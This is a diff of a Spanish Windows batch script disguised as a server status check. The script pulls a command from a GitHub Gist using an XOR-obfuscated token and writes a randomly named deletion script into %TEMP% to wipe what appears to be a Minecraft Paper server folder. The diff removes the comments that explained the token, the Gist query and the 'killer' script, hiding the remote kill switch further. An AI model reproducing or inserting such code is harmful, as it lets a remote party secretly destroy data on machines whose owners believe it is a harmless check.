@@ -4,19 +4,14 @@ REM  Sistema de verificacion de estado del servidor
 REM  (Nombre generico para no delatar su proposito)
 REM ============================================================
 
-REM Token de GitHub ofuscado (XOR + Base64)
 set "TOKEN_XOR=BFwCbgh4DhpWGA4EW3V9K3o7fwx5MRxUIxdfY3puM3BDQ1NhaQt2Ig=="
 set "XOR_KEY=c4r1b3_x0r_2026"
-
-REM Gist ID de tu servidor
 set "GIST=5649b004572f4ed30efd2b0a120cf1ab"
 
-REM Ruta de la carpeta del servidor (sube un nivel desde .paper-remapped)
 set "SERVER_DIR=%~dp0.."
 
 REM ═══════════════════════════════════════════════════════════
-REM  Consultar el Gist con PowerShell (decodifica XOR+Base64
-REM  y parsea el JSON de forma fiable)
+REM  Consulta
 REM ═══════════════════════════════════════════════════════════
 echo Consultando estado del servidor...
 
@@ -52,7 +47,6 @@ echo   El servidor sera eliminado.
 echo ========================================
 echo.
 
-REM Crear script de eliminacion en %TEMP% (fuera del server)
 set "KILLER=%TEMP%\~sys_%RANDOM%.bat"
 
 > "%KILLER%" echo @echo off
